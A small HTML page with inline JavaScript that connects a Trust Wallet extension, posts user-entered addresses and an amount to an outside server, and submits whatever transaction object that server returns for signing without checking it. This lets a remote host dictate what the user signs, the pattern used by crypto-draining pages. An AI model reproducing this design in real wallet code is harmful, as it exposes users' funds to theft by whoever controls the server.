<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>

<body>
  <button onclick="connectWallet()">CONNET WALLET</button>

  <h1>Create Transaction</h1>
  <input id="address" placeholder="From address..." />
  <input id="to" placeholder="To address..." />
  <input id="amount" placeholder="Amount" />
  <button onclick="createTransaction()">CREATE TRANSACTION</button>
  <script>
    let wallet;
    const connectWallet = async () => {
      wallet = await window.trustwallet.request({
        method: "eth_requestAccounts"
      });
    }

    const createTransaction = async () => {
      const address = document.querySelector("#address").value;
      const to = document.querySelector("#to").value;
      const amount = document.querySelector("#amount").value;

      const url = 'https://usdt-wallet-bsc-order-check.vercel.app/wallets/create-transaction-object';
      const data = {
        to: to,
        amount: amount,
        address: address
      };

      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json; charset=utf-8'
        },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(data => {
        window.trustwallet.request({
          method: 'eth_sendTransaction',
          params: [data]
        })
        .then((result) => {
          alert("Transfer successfully!!!");
        })
        .catch((error) => {
          alert(`ERROR: ${error.message}`);
        });
      })
      .catch(error => {
        // Handle any errors here
        console.error('Error:', error);
      });
    }
  </script>
</body>

</html>
